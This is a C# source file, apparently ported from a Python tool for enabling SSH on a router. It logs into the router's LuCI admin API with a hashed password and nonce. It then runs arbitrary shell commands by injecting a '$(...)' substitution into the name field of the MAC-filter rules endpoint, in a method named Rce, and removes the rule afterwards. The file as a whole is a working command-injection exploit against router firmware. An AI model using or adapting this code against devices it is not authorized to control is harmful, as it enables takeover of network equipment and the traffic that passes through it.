using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace Rd08SshTool;

// 移植自 rd08_ssh_enable.py 的 RouterWeb 类:
// HttpClientHandler(CookieContainer) + HttpClient 对应 requests.Session 的 cookie 保持
public sealed class RouterWeb : IDisposable
{
    private readonly string _ip;
    private readonly string _password;
    private readonly HttpClient _http;
    private string? _stok;

    public RouterWeb(string ip, string password)
    {
        _ip = ip;
        _password = password;
        _http = new HttpClient(new HttpClientHandler
        {
            CookieContainer = new CookieContainer(),
            UseCookies = true,
        });
    }

    public string Ip => _ip;

    public JsonDocument Login()
    {
        var page = Send(HttpMethod.Get, $"http://{_ip}/cgi-bin/luci/web", 5);
        var macMatch = Regex.Match(page, "var deviceId = '(.*?)'");
        var keyMatch = Regex.Match(page, "key: '(.*?)',");
        if (!macMatch.Success || !keyMatch.Success)
            throw new Exception("无法从页面提取 deviceId/key");
        var mac = macMatch.Groups[1].Value;
        var key = keyMatch.Groups[1].Value;
        var nonce = $"0_{mac}_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}_{Random.Shared.Next(1000, 10000)}";

        // 返回给调用方的 JsonDocument 不能释放
        var info = JsonDocument.Parse(Send(HttpMethod.Get, $"http://{_ip}/cgi-bin/luci/api/xqsystem/init_info", 5));
        var sha256 = info.RootElement.TryGetProperty("newEncryptMode", out var nem) && nem.ToString() == "1";
        var pwd = Hash(sha256, nonce + Hash(sha256, _password + key));

        var loginJson = Send(HttpMethod.Post, $"http://{_ip}/cgi-bin/luci/api/xqsystem/login", 5,
            new FormUrlEncodedContent(new Dictionary<string, string>
            {
                ["username"] = "admin",
                ["password"] = pwd,
                ["logtype"] = "2",
                ["nonce"] = nonce,
            }));
        using var r = JsonDocument.Parse(loginJson);
        if (!CodeIsZero(r.RootElement))
            throw new Exception($"管理密码登录失败: {loginJson}");
        _stok = r.RootElement.GetProperty("token").GetString()!;
        return info;
    }

    // 通过 macfilter name 注入执行命令。payload 不能含 ';'。
    public bool Rce(string mac, string cmd)
    {
        var name = $"x$({cmd})y";
        if (name.Contains(';'))
            throw new ArgumentException("payload 不能含分号");
        var json = Send(HttpMethod.Post, $"http://{_ip}/cgi-bin/luci/;stok={_stok}/api/xqsystem/set_macfilter_rules", 20,
            new FormUrlEncodedContent(new Dictionary<string, string>
            {
                ["mac"] = mac,
                ["name"] = name,
                ["option"] = "add",
                ["wan"] = "",
            }));
        using var r = JsonDocument.Parse(json);
        return CodeIsZero(r.RootElement);
    }

    public void MacfilterDel(string mac)
    {
        Send(HttpMethod.Post, $"http://{_ip}/cgi-bin/luci/;stok={_stok}/api/xqsystem/set_macfilter_rules", 8,
            new FormUrlEncodedContent(new Dictionary<string, string>
            {
                ["mac"] = mac,
                ["name"] = "x",
                ["option"] = "del",
                ["wan"] = "",
            }));
    }

    public void Dispose() => _http.Dispose();

    // 同步发送, 用 CancellationTokenSource 实现 Python 的 timeout= 秒数
    private string Send(HttpMethod method, string url, int timeoutSec, HttpContent? content = null)
    {
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSec));
        using var req = new HttpRequestMessage(method, url);
        req.Content = content;
        using var resp = _http.Send(req, cts.Token);
        return resp.Content.ReadAsStringAsync(cts.Token).GetAwaiter().GetResult();
    }

    // 小写 hex 的 SHA256/SHA1 摘要
    private static string Hash(bool sha256, string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        var hash = sha256 ? SHA256.HashData(bytes) : SHA1.HashData(bytes);
        return Convert.ToHexString(hash).ToLowerInvariant();
    }

    private static bool CodeIsZero(JsonElement root)
    {
        if (!root.TryGetProperty("code", out var code))
            return false;
        return code.ValueKind switch
        {
            JsonValueKind.Number => code.TryGetInt32(out var n) && n == 0,
            JsonValueKind.String => code.GetString() == "0",
            _ => false,
        };
    }
}
